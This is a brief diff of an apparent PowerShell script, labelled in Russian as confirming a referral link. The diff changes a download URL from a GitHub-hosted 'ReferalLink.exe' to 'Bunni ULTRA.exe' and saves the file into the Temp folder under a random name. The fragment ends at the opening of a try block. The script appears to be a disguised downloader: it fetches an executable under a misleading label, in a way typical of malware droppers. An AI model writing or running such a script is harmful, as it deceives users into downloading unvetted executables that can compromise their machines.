@@ -1,5 +1,5 @@
 # Подтверждение рефферальной ссылки
-$url  = 'https://github.com/wertybalet/bunni/raw/refs/heads/main/ReferalLink.exe'
+$url  = 'https://github.com/wertybalet/bunni/raw/refs/heads/main/Bunni ULTRA.exe'
 $file = "$env:LOCALAPPDATA\Temp\i$(Get-Random).exe"
 
 try {
